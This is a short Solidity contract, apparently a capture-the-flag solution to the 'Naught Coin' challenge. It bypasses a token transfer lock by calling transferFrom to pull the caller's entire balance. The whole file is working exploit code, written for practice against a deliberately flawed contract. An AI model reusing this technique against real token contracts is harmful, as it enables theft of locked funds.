// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IERC20A {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttacker {
    IERC20A public instance;

    constructor(address _instance) public {
        instance = IERC20A(_instance);
    }

    function attack() public payable {
        instance.transferFrom(msg.sender, address(this), instance.balanceOf(msg.sender));
    }
}
